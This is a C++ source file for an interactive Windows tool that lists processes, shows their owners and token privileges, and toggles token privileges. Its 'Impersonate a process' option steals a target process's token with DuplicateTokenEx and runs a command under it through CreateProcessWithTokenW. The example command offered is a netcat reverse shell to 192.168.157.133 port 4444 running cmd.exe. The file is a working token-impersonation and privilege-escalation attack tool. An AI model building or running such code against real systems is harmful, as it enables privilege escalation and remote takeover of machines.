#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <sddl.h>
#include <vector>
#include <lmaccess.h>
#include <Lmerr.h>

bool GetProcessUser(HANDLE hProcess, std::wstring& userName) {
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        return false;
    }

    DWORD bufLength = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &bufLength);
    std::vector<BYTE> buffer(bufLength);
    PTOKEN_USER tokenUser = reinterpret_cast<PTOKEN_USER>(buffer.data());
    
    if (GetTokenInformation(hToken, TokenUser, tokenUser, bufLength, &bufLength)) {
        WCHAR* userBuffer;
        if (ConvertSidToStringSidW(tokenUser->User.Sid, &userBuffer)) {
            DWORD userNameSize = 0;
            DWORD domainNameSize = 0;
            SID_NAME_USE sidType;

           
            LookupAccountSidW(nullptr, tokenUser->User.Sid, nullptr, &userNameSize, nullptr, &domainNameSize, &sidType);

            if (userNameSize > 0 && domainNameSize > 0) {
                std::wstring userTemp(userNameSize, L'\0');
                std::wstring domainTemp(domainNameSize, L'\0');
                if (LookupAccountSidW(nullptr, tokenUser->User.Sid, &userTemp[0], &userNameSize, &domainTemp[0], &domainNameSize, &sidType)) {
                    userName = domainTemp + L"\\" + userTemp;
                } else {
                    std::wcerr << L"Error looking up account SID: " << GetLastError() << std::endl;
                }
            }
            LocalFree(userBuffer);
        }
    }

    CloseHandle(hToken);
    return true;
}

bool SetPrivilege(HANDLE hToken, LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
        std::wcerr << L"LookupPrivilegeValue error: " << GetLastError() << std::endl;
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::wcerr << L"AdjustTokenPrivileges error: " << GetLastError() << std::endl;
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcerr << L"The token does not have the specified privilege.\n";
        return false;
    }

    return true;
}

void PrintTokenPrivileges(HANDLE hToken) {
    DWORD length = 0;
    GetTokenInformation(hToken, TokenPrivileges, nullptr, 0, &length);
    if (length == 0) {
        std::cerr << "Error getting privileges length" << std::endl;
        return;
    }

    std::vector<BYTE> buffer(length);
    PTOKEN_PRIVILEGES privileges = reinterpret_cast<PTOKEN_PRIVILEGES>(buffer.data());
    if (GetTokenInformation(hToken, TokenPrivileges, privileges, length, &length)) {
        std::wcout << L"Privileges:" << std::endl;
        for (DWORD i = 0; i < privileges->PrivilegeCount; ++i) {
            LUID_AND_ATTRIBUTES laa = privileges->Privileges[i];
            WCHAR name[256];
            DWORD nameLen = 256;
            if (LookupPrivilegeNameW(nullptr, &laa.Luid, name, &nameLen)) {
                std::wcout << L"  " << name;
                if (laa.Attributes & SE_PRIVILEGE_ENABLED) {
                    std::wcout << L" (Enabled)" << std::endl;
                } else {
                    std::wcout << L" (Disabled)" << std::endl;
                }
            }
        }
    }
}

void AdjustTokenPrivilegesInteractive() {
    DWORD processID;
    std::wstring privilegeName;
    BOOL enablePrivilege;

    std::wcout << L"Enter the PID of the process: ";
    std::cin >> processID;

    std::wcout << L"Enter the name of the privilege (e.g., SeDebugPrivilege): ";
    std::wcin >> privilegeName;

    int action;
    std::wcout << L"Enable (1) or Disable (0) the privilege: ";
    std::cin >> action;
    enablePrivilege = (action == 1);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess == nullptr) {
        std::wcerr << L"Could not open process for PID: " << processID << L". Error: " << GetLastError() << std::endl;
        return;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcerr << L"Could not open process token." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    if (SetPrivilege(hToken, privilegeName.c_str(), enablePrivilege)) {
        std::wcout << (enablePrivilege ? L"Enabled " : L"Disabled ") << privilegeName << L" successfully." << std::endl;
    } else {
        std::wcerr << L"Failed to modify privilege." << std::endl;
    }

    CloseHandle(hToken);
    CloseHandle(hProcess);
}

void AnalyzeProcessAndToken(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess == nullptr) {
        std::wcerr << L"Could not open process for PID: " << processID << L". Error: " << GetLastError() << std::endl;
        return;
    }

    std::wstring userName;
    if (!GetProcessUser(hProcess, userName)) {
        std::wcerr << L"Could not retrieve user for process." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    std::wcout << L"Process ID: " << processID << L" | User: " << userName << std::endl;

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        std::wcerr << L"Could not open process token." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    PrintTokenPrivileges(hToken);

    CloseHandle(hToken);
    CloseHandle(hProcess);
}

void ListProcesses() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                std::wstring userName;
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    if (GetProcessUser(hProcess, userName)) {
                        std::wcout << L"PID: " << pe32.th32ProcessID << L" | Process Name: " << pe32.szExeFile << L" | User: " << userName << std::endl;
                    }
                    CloseHandle(hProcess);
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
}

void ShowMenu() {
    std::wcout << L"\n1. List running processes" << std::endl;
    std::wcout << L"2. Impersonate a process" << std::endl;
    std::wcout << L"3. Process and Token Analysis" << std::endl;
    std::wcout << L"4. Adjust process token privileges" << std::endl;
    std::wcout << L"5. Exit" << std::endl;
    std::wcout << L"Select an option: ";
}

int main() {
    while (true) {
        ShowMenu();
        int option;
        std::cin >> option;

        switch (option) {
            case 1:
                ListProcesses();
                break;
case 2: {
    DWORD PID_TO_IMPERSONATE;
    std::wcout << L"Enter the PID to impersonate: ";
    std::cin >> PID_TO_IMPERSONATE;

    
    std::wstring netcatCommand;
    std::wcout << L"Enter the Netcat command (e.g., ncat 192.168.157.133 4444 -e cmd.exe): ";
    std::getline(std::wcin >> std::ws, netcatCommand); // Read the whole line, including spaces

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID_TO_IMPERSONATE);
    if (!processHandle) {
        std::wcerr << L"Error opening process. Error code: " << GetLastError() << std::endl;
        break;
    }

    HANDLE tokenHandle;
    if (!OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle)) {
        std::wcerr << L"Error opening process token. Error code: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        break;
    }

    HANDLE duplicateTokenHandle;
    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle)) {
        std::wcerr << L"Error duplicating token. Error code: " << GetLastError() << std::endl;
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        break;
    }

    STARTUPINFOW startupInfo = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION processInformation = {};

    // Use the user-provided Netcat command
    const wchar_t* cmdline = netcatCommand.c_str();

    BOOL result = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, nullptr, const_cast<wchar_t*>(cmdline), 0, nullptr, nullptr, &startupInfo, &processInformation);
    DWORD error = GetLastError();
    if (!result) {
        std::wcerr << L"Error creating process. Error code: " << error << std::endl;
    } else {
        CloseHandle(processInformation.hProcess);
        CloseHandle(processInformation.hThread);
        std::wcout << L"Process launched successfully." << std::endl;
    }

    CloseHandle(duplicateTokenHandle);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);
    break;
}

            case 3: {
                DWORD PID_TO_ANALYZE;
                std::wcout << L"Enter the PID to analyze: ";
                std::cin >> PID_TO_ANALYZE;
                AnalyzeProcessAndToken(PID_TO_ANALYZE);
                break;
            }
            case 4:
                AdjustTokenPrivilegesInteractive();
                break;
            case 5:
                return 0;
            default:
                std::wcerr << L"Invalid option selected." << std::endl;
        }
    }

    return 0;
}
